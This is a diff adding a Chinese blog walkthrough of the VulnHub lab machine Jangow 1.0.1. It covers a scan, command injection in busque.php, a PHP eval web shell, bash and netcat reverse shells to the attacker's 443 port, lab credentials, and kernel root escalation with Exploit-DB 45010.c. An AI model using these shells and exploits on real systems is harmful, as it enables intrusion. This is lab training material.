@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>Jangow-1-01</title>
+      <link href="/article/Jangow-1-01/"/>
+      <url>/article/Jangow-1-01/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>jangow: 1.0.1</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/jangow-101,754/">vulnhub靶场-Jangow: 1.0.1</a></p><p>目标: 没说, get root吧</p><p>还是比较简单的靶机, 唯一难受的就是网络配置问题了</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.110.130</p><p>target: 192.168.110.131</p><blockquote><p>注意此处可能会存在网络问题, 这里就不再给出解决办法</p><p>该靶机被笔者用于测试别的功能, 所以环境可能不太一样</p></blockquote><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.110.0/24</span><br></pre></td></tr></table></figure><p>开放端口21, 80</p><p>访问之后在<code>192.168.110.131/site/</code>找到一个类似博客的地方, 其中在<code>http://192.168.110.131/site/busque.php?buscar=</code>处发现似乎是一个注入点</p><p>测试得到可以进行RCE:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241019195039215.png" alt="image-20241019195039215"></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>可以写shell, 也可以直接反弹shell, 这里选择了写shell然后蚁剑连接</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;</span> &gt; shell1.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241019195418116.png" alt="image-20241019195418116"></p><p>反弹shell可以用php重新写一个文件用来反弹shell, 这里直接用的命令执行</p><p>除了443端口 似乎都反弹不出去</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># RCE反弹</span></span><br><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.110.130/443 0&gt;&amp;1&#x27;</span></span><br><span class="line"><span class="comment"># php反弹</span></span><br><span class="line">&lt;?php system(<span class="string">&quot;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.110.130 443 &gt;/tmp/f&quot;</span>);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241019200554300.png" alt="image-20241019200554300"></p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure><p>在<code>/var/www/html/site/wordpress</code>下有配置文件, 给了mysql的账密<code>desafio02 : abygurl69</code></p><p>只能用于登录ftp, 但是ftp也拿不到东西</p><p>在<code>/var/www/html/.backup</code>中找到新的账密, <code>jamgow01 : abygurl69</code></p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>已知版本为 4.4.0-31-generic 的 Ubuntu</p><p><img src="C:/Users/CAO/AppData/Roaming/Typora/typora-user-images/image-20241019214740861.png" alt="image-20241019214740861"></p><p>对应漏洞为<code>CVE-2017-16995</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate linux/local/45010.c</span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/45010.c ~/Desktop</span><br><span class="line"><span class="comment"># 是非root情况</span></span><br></pre></td></tr></table></figure><p>然后用蚁剑上传到靶机, 当然用python开一个http服务也行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 45010.c</span><br><span class="line">gcc 45010.c -o exp</span><br><span class="line"><span class="built_in">chmod</span> 777 exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure><p>执行命令编译出来的文件即可, 成功提权</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241019215539082.png" alt="image-20241019215539082"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Linux </tag>
+            
+            <tag> 提权 </tag>
+            
+            <tag> 漏洞利用 </tag>
+            
+            <tag> 反弹shell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Web入门_phpCVE</title>
       <link href="/article/ctfshow-webbasic-phpcve/"/>
       <url>/article/ctfshow-webbasic-phpcve/</url>
